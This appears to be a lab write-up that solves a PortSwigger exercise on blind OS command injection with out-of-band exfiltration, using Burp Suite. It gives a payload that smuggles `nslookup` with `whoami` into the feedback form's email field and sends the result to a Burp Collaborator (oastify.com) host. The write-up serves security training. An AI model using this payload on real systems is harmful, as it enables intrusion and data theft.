## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7391dd38-a47d-4924-8204-929ac73dfdc2)

## Solution :

Use Burp Suite Professional to intercept and modify the request that submits feedback.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/99d1803e-0762-43d6-a924-fdaf46ebd99d)

Modify the email parameter, changing it
we know that is vulnerable to Blind Command injection. so we need to use `whoami` to extract the data so the payload will be.

`email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f797dcea-4152-4cca-bef9-b81937e79e98)

Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

qury will be changed to `email=||nslookup+`whoami`.r0sad6oety6ehd1bnvxgtr7co3uuik69.oastify.com||`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/39eb302b-6db5-4f73-a4b3-959751e7bb7b)

Then go to Burp Collaborator press poll now.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4c76caba-ac3d-4f5a-9b75-fc21b644c789)

We get the username in the details panel - `peter-6cAZQt`

Then go to the home page and click on submit solution.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/33be0e56-6c2f-4505-a424-d82777e59609)

LAB solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0a811e9a-92d4-4a5c-8495-f84b093d4107)


